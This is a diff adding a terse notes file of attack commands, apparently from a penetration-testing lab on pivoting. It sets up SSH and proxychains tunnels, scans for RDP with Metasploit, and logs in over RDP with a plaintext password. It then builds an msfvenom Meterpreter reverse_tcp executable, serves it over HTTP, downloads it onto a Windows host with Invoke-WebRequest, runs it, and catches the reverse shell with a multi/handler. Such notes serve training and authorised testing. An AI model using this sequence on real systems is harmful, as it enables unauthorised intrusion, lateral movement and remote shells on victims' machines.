@@ -1,0 +1,43 @@
+
+ssh into the ubuntu box and input password
+
+ssh -L 1234:localhost:3306 Ubuntu@inputubuntuip
+
+ifconfig
+
+ssh -D 9050 ubuntu@inputubuntuip
+
+tail -4 /etc/proxychains.conf
+
+msfconsole
+
+proxychains msfconsole
+
+search rdp_scanner
+
+set rhosts 172.16.5.19
+
+proxychains xfreerdp /v:172.16.5.xwindowsserverip /u:victor /p:pass@123
+
+============================================
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.xwindowsserverip LPORT=8080 --format exe > payload.exe 
+====================================================
+scp payload.exe ubuntu@inputubuntuip:~/
+=============================================
+python3 -m http.server 8125
+===================================
+Invoke-WebRequest -Uri "http://172.16.5.xwindowsserverip:8125/payload.exe" -OutFile "C:\payload1.exe"
+=================================================
+ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@inputubuntuip -vN
+
+====================================================
+run the payload from the windows box .\payload1.exe
+
+
+============================================
+msfconsole
+use exploit/multi/handler
+set payload windows/shell/reverse_tcp
+set lhost 0.0.0.0
+set lport 8000
+run
